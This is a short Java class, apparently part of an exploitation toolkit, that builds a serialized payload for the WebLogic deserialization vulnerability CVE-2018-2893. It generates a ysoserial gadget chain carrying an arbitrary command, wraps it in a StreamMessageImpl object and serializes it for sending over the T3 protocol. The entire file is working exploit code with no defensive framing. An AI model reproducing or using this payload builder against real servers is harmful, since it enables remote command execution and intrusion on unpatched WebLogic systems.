package com.payload.t3;

import util.Ysoserial;
import weblogic.jms.common.StreamMessageImpl;

import javax.jms.JMSException;
import java.io.*;


public class CVE_2018_2893 {
    public static byte[] payload(String path,String gadget,String command) throws IOException, JMSException {
        byte[] payload = Ysoserial.generate_gadget(path,gadget,command);
        StreamMessageImpl streamMessage = new StreamMessageImpl();
        streamMessage.setDataBuffer(payload,payload.length);
        byte[] payload1 = Ysoserial.serial(streamMessage);
        return payload1;

    }
}
